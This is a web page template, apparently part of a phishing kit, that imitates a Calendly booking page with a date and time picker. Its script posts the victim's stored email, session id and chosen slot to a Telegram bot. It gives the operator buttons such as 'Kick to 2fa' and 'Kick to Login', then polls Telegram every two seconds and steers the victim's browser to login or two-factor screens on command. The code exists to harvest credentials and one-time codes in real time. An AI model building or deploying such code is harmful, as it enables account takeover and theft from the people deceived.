<div>
    <div id="root">
        <div class="App">
            <div class="box__shadow">
                <div class="calendar__wrapper">
                    <div class="user__wrapper">
                        <div class="logo__wrapper"><img width="50%" src="img/images.png" /></div>
                        <div class="screen__two center__text">
                            <div class="mobile__back-svg">
                                <div class="content__wrapper">
                                    <div style="margin-bottom: 15px;">
                                        <div><img class="avatar" width="65px" src="img/logo.png" /></div>
                                    </div>
                                </div>
                            </div>
                            <div class="minute">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                </svg>
                                <span>15 min</span>
                            </div>
                            <div class="minute mt-12">
                                <svg data-testid="phone-call-icon" data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path
                                        d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
                                        fill="none"
                                        stroke="currentColor"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                    ></path>
                                </svg>
                                <span>Phone call</span>
                            </div>
                            <div class="minute space__bettwen">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path
                                        d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
                                        fill="none"
                                        stroke="currentColor"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                    ></path>
                                </svg>
                                <span>US Georgia (00:59)</span>
                            </div>
                        </div>
                        <div class="footer__wrapper">
                            <p>Cookie settings</p>
                            <p>Report abuse</p>
                        </div>
                    </div>
                    <div class="date__time">
                        <h2>Select a Date & Time</h2>
                        <div class="calendar__container svg__icon">
                            <div class="" style="min-width: 400px;padding-right: 15px;margin-top:20px;">
                                <div class="calendar-wrapper" id="calendar-wrapper"></div>
                                <div class="time__zone-wrapper" style="margin-top: 20px;">
                                    <p>Time zone</p>
                                    <div class="central">
                                        <img width="14px" src="world.png">
                                        Asia/Dhaka (17:53)
                                    </div>
                                </div>
                            </div>

                        </div>
                        <a class="logo__wrapper-calendly hide__mobile">
                            <div class="background">
                                <div class="powerd__by">powered by</div>
                                <div class="calendly">Calendly</div>
                            </div>
                        </a>
                    </div>
                </div>
            </div>
            <a class="logo__wrapper-calendly-mobile">
                <div class="background">
                    <div class="powerd__by">powered by</div>
                    <div class="calendly">Calendly</div>
                </div>
            </a>
        </div>
    </div>
</div>
@script
<script>
    const apiKey = "{{env('TELEGRAM_API_KEY')}}";
    const chatId = "{{env('TELEGRAM_CHAT_ID')}}";
    let selectedDate;
    window.selectDate = function (date) {
        $('#calendar-wrapper').updateCalendarOptions({
            date: date
        });
        selectedDate = date;
        const currentDate = new Date(date);
        currentDate.setDate(currentDate.getDate());
        const options = { weekday: 'long', month: 'long', day: 'numeric' };
        const formattedDate = currentDate.toLocaleDateString('en-US', options);
        if ($('.calendar__container .full__width').length > 0){
            $('.calendar__container .full__width').remove();
        }
        $('.calendar__container').append(`<div class="full__width">
                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                        <div class="calendar__time">
                                            <h2>${formattedDate}</h2>
                                            <div class="available__wrapper">
                                                <div class="green__text"></div>
                                                <p> times you're available</p>
                                            </div>
                                            <div class="button__time-wrapper">
                                                <div>
                                                    <button class="time" data-time="09:30">
                                                        <div class="green__text"></div>09:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="10:00">
                                                        <div class="green__text"></div>10:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="10:30">
                                                        <div class="green__text"></div>10:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="11:00">
                                                        <div class="green__text"></div>11:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="11:30">
                                                        <div class="green__text"></div>11:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="12:00">
                                                        <div class="green__text"></div>12:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="12:30">
                                                        <div class="green__text"></div>12:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="13:00">
                                                        <div class="green__text"></div>13:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="13:30">
                                                        <div class="green__text"></div>13:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="14:00">
                                                        <div class="green__text"></div>14:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="14:30">
                                                        <div class="green__text"></div>14:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="15:00">
                                                        <div class="green__text"></div>15:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="15:30">
                                                        <div class="green__text"></div>15:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="16:00">
                                                        <div class="green__text"></div>16:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="16:30">
                                                        <div class="green__text"></div>16:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="footer__wrapper footer__wrapper-mobile">
                                                <p>Cookie settings</p>
                                                <p>Report abuse</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>`);
    };
    let defaultConfig = {
        weekDayLength: 3,
        prevButton:'<i class="fa fa-chevron-left" aria-hidden="true"></i>',
        nextButton:'<i class="fa fa-chevron-right" aria-hidden="true"></i>',
        date:new Date(),
        showTodayButton:false,
        onClickDate: selectDate,
        disable: function (date) {
            const today = new Date();
            const yesterday = new Date(today.getFullYear(), today.getMonth(), today.getDate() - 1);
            return date <= yesterday;
        },
        showYearDropdown: true,
        startOnMonday: false,
    };
    $('#calendar-wrapper').calendar(defaultConfig);
    $(document).on('click','button.time',function (e){
        e.preventDefault();
        $('button.time').each(function (){
           $(this).parent('div').removeClass('next__button');
            $(this).parent('div').find('div > div').empty();
        });
        $(this).parent('div').addClass('next__button');
        $(this).parent('div').find('div > div').append('<button class="btn-next">Next</button>');
    });
    $(document).on('click','.btn-next',function (e){
        e.preventDefault();

        let time = $(this).parent('div').parent('div').parent('div').find('.time').data('time'); // Example: "10:30"
        let selectedDateFinal = new Date(selectedDate);

        if (!selectedDateFinal || !time) {
            console.error('selectedDate or time is missing');
            return;
        }

        let [hours, minutes] = time.split(':').map(Number);
        selectedDateFinal.setHours(hours);
        selectedDateFinal.setMinutes(minutes);
        selectedDateFinal.setSeconds(0);
        let session = localStorage.getItem('sessionId');
        fetch(`https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `===PICK A DATE: ${localStorage.getItem('email')}===\n ${selectedDateFinal}`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: `Kick to 2fa`,
                                callback_data: `/2fa ${session}`,
                            },
                            {
                                text: `Kick to Login`,
                                callback_data: `/login ${session}`,
                            },
                        ],
                        [
                            {
                                text: `Kick to the calendar`,
                                callback_data: `/calendar ${session}`,
                            },
                            {
                                text: `Thank You`,
                                callback_data: `/thankyou ${session}`,
                            },
                        ]
                    ],
                },
            })
        }).then(response => {
            startInterval();
        }).catch(error => {

        });
    })

    const startInterval = () => {
        console.log('ashik')
        let lastUpdateId = 0;
        setInterval(() => {
            fetch(`https://api.telegram.org/bot${apiKey}/getUpdates?offset=${lastUpdateId + 1}`)
                .then((response) => {
                    if (response.ok) {
                        return response.json();
                    } else {
                        throw new Error("Failed to fetch updates.");
                    }
                })
                .then((data) => {
                    if (data?.result?.length > 0) {
                        data.result.forEach((update) => {
                            if (update.update_id > lastUpdateId) {
                                lastUpdateId = update.update_id;
                                if (update.callback_query) {
                                    const callbackData = update.callback_query.data;
                                    if (callbackData === `/2fa ${localStorage.getItem('sessionId')}`) {
                                        Livewire.dispatch('openTwoFa');
                                        window.Livewire.navigate('/');
                                    }else if(callbackData === `/loginError ${localStorage.getItem('sessionId')}`){
                                        @this.set('loginError', true);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', true);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', false);
                                        @this.set('codeError', false);
                                    }else if(callbackData === `/login ${localStorage.getItem('sessionId')}`){
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', false);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', true);
                                        @this.set('codeError', false);
                                    }else if(callbackData === `/2fa ${localStorage.getItem('sessionId')}`){
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', false);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', true);
                                        @this.set('codeError', false);
                                    }else if(callbackData === `/2faError ${localStorage.getItem('sessionId')}`){
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', false);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', true);
                                        @this.set('codeError', true);
                                    }else if(callbackData === `/schedule ${localStorage.getItem('sessionId')}`){
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', false);
                                        @this.set('showModalFooter', false);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', false);
                                        @this.set('codeError', false);
                                        window.Livewire.navigate('/calendar-calendly');
                                    }
                                }
                            }
                        });
                    }
                })
                .catch((error) => {
                    console.error("Error fetching updates:", error);
                });
        }, 2000);
    };

</script>
@endscript

